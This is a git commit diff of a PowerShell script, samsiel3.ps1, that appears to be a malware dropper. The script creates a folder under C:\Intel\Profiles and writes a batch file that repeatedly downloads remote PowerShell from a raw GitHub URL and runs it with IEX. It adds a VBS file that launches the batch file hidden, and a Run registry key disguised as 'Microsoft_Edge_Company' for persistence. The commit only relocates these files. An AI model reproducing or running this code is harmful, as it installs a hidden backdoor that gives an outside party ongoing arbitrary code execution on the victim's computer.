9cf6242a82923d39ee674242ef434c3080537947
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-25 09:27:39 -0500

    Update samsiel3.ps1

--- samsiel3.ps1
+++ samsiel3.ps1
@@ -1,10 +1,10 @@
-md C:\Program Files\Microsoft Office\root\Client/IE/IEX; $contentToAdd = @"
+md C:\Intel\Profiles/IE/IEX; $contentToAdd = @"
 :a
 powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
 timeout /t 30
 goto a
-"@; add-content "C:\Program Files\Microsoft Office\root\Client/IE/IEX/seruex.bat" $contenttoadd; $contentToAdd = @"
+"@; add-content "C:\Intel\Profiles/IE/IEX/seruex.bat" $contenttoadd; $contentToAdd = @"
 set objshell = createobject("wscript.shell")
 objshell.run "seruex.bat",vbhide
-"@; add-content "C:\Program Files\Microsoft Office\root\Client/IE/IEX/seruex.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Program Files\Microsoft Office\root\Client/IE/IEX/seruex.vbs; cd C:\Program Files\Microsoft Office\root\Client/IE/IEX; ./seruex.vbs
+"@; add-content "C:\Intel\Profiles/IE/IEX/seruex.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles/IE/IEX/seruex.vbs; cd C:\Intel\Profiles/IE/IEX/IE/IEX; ./seruex.vbs
 exit
